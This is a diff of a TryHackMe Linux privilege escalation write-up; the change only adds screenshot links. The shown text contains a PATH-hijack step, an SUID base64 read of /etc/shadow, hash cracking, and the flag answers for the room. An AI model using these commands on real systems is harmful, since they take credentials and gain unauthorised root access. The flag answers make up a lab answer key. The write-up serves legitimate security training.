@@ -356,7 +356,7 @@ Exploit the $PATH vulnerability to read the content of the flag6.txt file.
    echo "cat /home/matt/flag6.txt" > thm
    ```
 
-   PATH PREP
+   ![Path Prep](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Path_Prep.png)
 
    Now we must make the file executable and run the test file.
 
@@ -366,7 +366,7 @@ Exploit the $PATH vulnerability to read the content of the flag6.txt file.
    ./test
    ```
 
-   PATH FLAG
+   ![Path Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Path_Flag.png)
 
    ><details><summary>Click for answer</summary>THM-736628929</details>
 
@@ -378,7 +378,7 @@ Exploit the $PATH vulnerability to read the content of the flag6.txt file.
    showmount -e 10.10.6.120 
    ```
 
-   NFS SHARES
+   ![NFS Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_NFS_Shares.png)
 
    ><details><summary>Click for answer</summary>3</details>
 
@@ -388,7 +388,7 @@ Exploit the $PATH vulnerability to read the content of the flag6.txt file.
    cat /etc/exports
    ```
 
-   NFS SQUASH
+   ![NFS Squash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_NFS_Squash.png)
 
    ><details><summary>Click for answer</summary>3</details>
 
@@ -407,7 +407,7 @@ Gain a root shell on the target system
    gcc nfs.c -o nfs -w
    ```
 
-   NFS SCRIPT
+   ![NFS Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_NFS_Script.png)
 
    Unfortunately, I would get errors messages when trying to compile to file. In the end this just didn't seem to work on my system.
 
@@ -429,11 +429,11 @@ Gain a root shell on the target system
    find / -type f -perm -4000 2>/dev/null
    ```
 
-   CAPSTONE SUID
+   ![Suid](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Suid.png)
 
    Using GTFOBins, we can see how we can read such files.
 
-   CAPSTONE SUID GTFO
+   ![Suid Gtfo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Suid_Gtfo.png)
 
    Unfortunately, we don't know the location of the flags yet, but we can try and read the shadow file.
    
@@ -441,7 +441,7 @@ Gain a root shell on the target system
    /usr/bin/base64 "/etc/shadow" | base64 --decode
    ```
 
-   CAPSTON SHADOW
+   ![Shadow](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Shadow.png)
 
    Cracking missy's hash with John gives us her password (unfortunately we couldn't crack roots password).
 
@@ -455,7 +455,7 @@ Gain a root shell on the target system
 
    This flag we can actually read now.
 
-   CAPSTONE FLAG1
+   ![Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag1.png)
 
    ><details><summary>Click for answer</summary>THM-42828719920544</details>
 
@@ -475,7 +475,7 @@ Gain a root shell on the target system
    sudo find /home -name flag* 2>/dev/null
    ```
 
-   CAPTSONE FLAG LOCATION
+   ![Flag Location](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag_Location.png)
 
    We can now either use the same `base64` exploit to read the flag or we can escalate our privileges to root with the find binary.
 
@@ -483,7 +483,7 @@ Gain a root shell on the target system
    /usr/bin/base64 "/home/rootflag/flag2.txt" | base64 --decode
    ```
 
-   CAPSTONE FLAG2 BASE
+   ![Flag2 Base](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag2_Base.png)
 
    Or
 
@@ -493,6 +493,6 @@ Gain a root shell on the target system
    cat /home/rootflag/flag2.txt
    ```
 
-   CAPSTONE FLAG2 ROOT   
+   ![Flag2 Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag2_Root.png)
 
    ><details><summary>Click for answer</summary>THM-168824782390238</details>
